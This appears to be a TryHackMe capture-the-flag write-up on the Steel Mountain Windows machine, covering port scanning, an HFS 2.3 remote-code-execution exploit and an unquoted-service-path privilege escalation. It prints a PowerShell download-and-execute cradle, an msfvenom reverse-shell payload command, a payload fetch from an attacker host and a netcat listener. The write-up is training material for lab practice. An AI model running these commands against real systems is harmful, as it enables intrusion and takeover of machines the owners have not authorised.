---
layout: single
title: SteelMountain - TryHackMe (OSCP STYLE)
excerpt: "On TryHackMe, the challenge of the Steel Mountain Machine is to be solved either through Metasploit or manually. This machine runs on Windows operating system. For this particular challenge, the manual approach will be followed to solve it."
date: 2023-04-14
classes: wide
header:
  teaser: /assets/images/steelmountain/portada.jpeg
  teaser_home_page: true
categories:
  - TryHackMe
  - infosec
tags:
  - TryHackMe
  - windows
  - Unquoted Service Path
  - HFS
---

## Introduccion

This is a write-up for the SteelMountain machine on the TryHackme platform. We tackled this pentesting exercise using the approach and methodology of OSCP.

## Enumeration

In this lab, we are dealing with a Windows machine.
For machine enumeration, we will scan all ports of the machine, request it to report back the open ports, and save all that information to a file to avoid making noise in case we need to refer back to it.
- -p-: Scans all ports
-	-oN nmap-initial-scan.txt: Saves output to a file named "nmap-initial-scan.txt"
-	-min-rate 5000: Specifies the minimum number of packets per second to be sent during the scan.
-	-T5: Sets the level of "aggressiveness" of the scan to 5, meaning that more intense and faster tests will be performed.
-	-Pn: Ignores checking whether the remote host is active and online.
-	-n: Disables DNS name resolution for IP addresses.

```sudo nmap -p- -sS --min-rate 5000 --open -T5 -vvv -n -Pn 10.10.178.153 -oG allPorts```
[1]:/assets/images/steelmountain/1.png

Upon port scanning, it was identified that a web server is being served on ports 80 and 8080. This indicates the presence of HTTP services on the target machine. Navigating to those ports, the following web pages were discovered.

[2]:/assets/images/steelmountain/2.png

This web page is only useful to solve the first question of the lab. In this write-up, we will focus on compromising the machine.

[3]:/assets/images/steelmountain/3.png

On the second page, we discovered an HttpFileServer 2.3. Using the "searchsploit" command to look for the name of this file, we found a Python script that allows remote command execution. This search was made possible by the ExploitDb database, which lists this exploit with the number 49584.

[4]:/assets/images/steelmountain/4.png

The script first sets some variables, including the IP address and port of the attacker machine (lhost and lport), and the IP address and port of the victim machine (rhost and rport). It then defines a command to be executed on the victim machine in PowerShell, which sets up a TCP connection to the attacker machine and sends the output of any executed commands back to the attacker machine.

It encodes this command in base64 format and creates a payload that includes the encoded command, which is then URL-encoded and sent to the victim machine as part of an HTTP GET request. Once the payload is received by the victim machine and executed, a reverse shell connection is established and the attacker machine can interact with the victim machine.

Finally ends by printing some debugging information and listening for incoming connections on the specified port using the netcat utility.

To make this script work, we need to change the first 4 parameters.

[5]:/assets/images/steelmountain/5.png

After running the script, we received the reverse shell on our machine.

[6]:/assets/images/steelmountain/6.png

[7]:/assets/images/steelmountain/7.png

By obtaining a reverse shell on the target machine, we were able to retrieve the first flag.

[8]:/assets/images/steelmountain/8.png

---

## Privilege escalation

It is important to note that we gained access with a PowerShell session, so all syntax used must be in this interpreter.

We used the PowerUp.ps1 tool to enumerate potential privilege escalation vectors within the machine. At the end of the script, we should add "Invoke-AllChecks" to perform the scan.

The GitHub repository to download the tool is:[Github](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)

We executed the script from our local machine using the Invoke-Expression tool, which means that the script was not downloaded or stored on the victim's machine.

```iex(New-Object Net.WebClient).downloadString('http://LIP:LPORT/PowerUp.ps1')```

We need to launch an HTTP server using Python, specifying the directory where the file mentioned above is located as the document root.

```sudo python3 -m http.server 8080```

[9]:/assets/images/steelmountain/9.png

The vulnerability detected by the tool is called "Unquoted Service Path".

[10]:/assets/images/steelmountain/10.png

The Unquoted Service Path vulnerability refers to an error in the way the path of a Windows service is specified in the registry. If the path contains spaces but is not enclosed in double quotes, the service may attempt to execute an unintended program or even a malicious backdoor. This vulnerability can be exploited if the user running the service has elevated privileges, allowing an attacker to escalate privileges to gain control over the system.

For example, let's say a Windows service is installed with a path of C:\Program Files\Example Service\service.exe. However, the service is registered in the registry without quotes around the path, like this:
HKLM\SYSTEM\CurrentControlSet\Services\ExampleService
ImagePath: C:\Program Files\Example Service\service.exe

If a user with administrative privileges attempts to start this service, Windows will search for the executable at the specified path. However, because the path contains spaces and is not enclosed in quotes, Windows will interpret the first space as a separator between the path and the first argument. In this case, Windows will attempt to execute C:\Program instead of C:\Program Files\Example Service\service.exe. If an attacker were to place a malicious file named C:\Program.exe on the system, Windows would execute that file instead of the intended service executable.
To exploit this vulnerability, an attacker could create a malicious file with a name like C:\Program.exe and place it on the system. When the vulnerable service is started, Windows would execute the malicious file instead of the intended executable, allowing the attacker to execute arbitrary code with elevated privileges.

To take advantage of the vulnerability on this machine, we will go to the path:

```C:\Program Files (x86)\IObit\```

This path is the first path where we can add an executable file due to user permissions.

Since we cannot access the C:\Program Files(x86) directory with our account privileges, we will place a vulnerable executable file named "Advanced.exe" generated with MSFVenom in this directory.

```msfvenom -p windows/x64/shell_reverse_tcp LHOST=x.x.x.x LPORT=xxx -f exe -o Advanced.exe```

We will use the Invoke-WebRequest tool from the target machine to request the file by sharing it from our machine to the target machine through the Python server.

```iwr -uri "http://AtackerIP:AtackerPort/Advanced.exe" -outfile "Advanced.exe```

[11]:/assets/images/steelmountain/11.png

Finally, we just need to stop and restart the service. When the service runs again, it will execute our script before the legitimate one, and it will call a listener that we have set up on our attacker machine as an administrator.

```stop-service AdvancedSystemCareService9
   start-service AdvancedSystemCareService9
   nc -lvnp AtackerPort
 ```
   

We receive the shell in the listener set up with netcat.

[12]:/assets/images/steelmountain/12.png

In conclusion, this CTF provided an opportunity to practice different hacking techniques and tools, including enumeration, vulnerability scanning, exploitation, and privilege escalation. We were able to compromise the target machine by exploiting known vulnerabilities and using social engineering tactics. This CTF also helped us improve our understanding of how attackers can gain unauthorized access to systems and the importance of implementing security best practices to protect against such attacks.
